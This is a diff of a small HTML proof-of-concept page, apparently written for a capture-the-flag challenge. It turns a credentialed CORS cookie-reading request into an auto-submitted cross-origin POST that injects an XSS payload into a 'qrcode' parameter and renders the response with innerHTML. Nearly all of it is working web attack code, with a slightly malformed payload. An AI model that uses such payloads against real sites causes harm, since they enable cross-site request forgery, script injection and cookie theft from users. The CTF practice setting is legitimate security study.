@@ -1,28 +1,24 @@
 <html>
-  <!-- CORS PoC to Retrieve the Flag -->
+  <!-- CORS PoC to Inject XSS Payload -->
   <body>
     <h2>CORS PoC</h2>
     <div id="demo"></div>
     <script>
       function corsRequest() {
         var xhr = new XMLHttpRequest();
-        xhr.open("GET", "http://ctf.widyasecurity.com/upload", true);
+        xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.withCredentials = true;
         xhr.onreadystatechange = function() {
           if (this.readyState == 4 && this.status == 200) {
-            // Assuming the flag is stored in a cookie named 'flag'
-            var flagCookie = document.cookie.split('; ').find(row => row.startsWith('flag='));
-            if (flagCookie) {
-              var flag = flagCookie.split('=')[1];
-              document.getElementById("demo").innerHTML = 'Flag: ' + flag;
-              alert('Flag: ' + flag);
-            } else {
-              document.getElementById("demo").innerHTML = 'Flag cookie not found.';
-              alert('Flag cookie not found.');
-            }
+            document.getElementById("demo").innerHTML = this.responseText;
           }
         };
-        xhr.send();
+        
+        // Vulnerable parameter with injected payload
+        var payload = "qrcode=</script><script>alert(document.cookie)></script>";
+        
+        xhr.send(payload);
       }
 
       // Automatically submit the request on page load
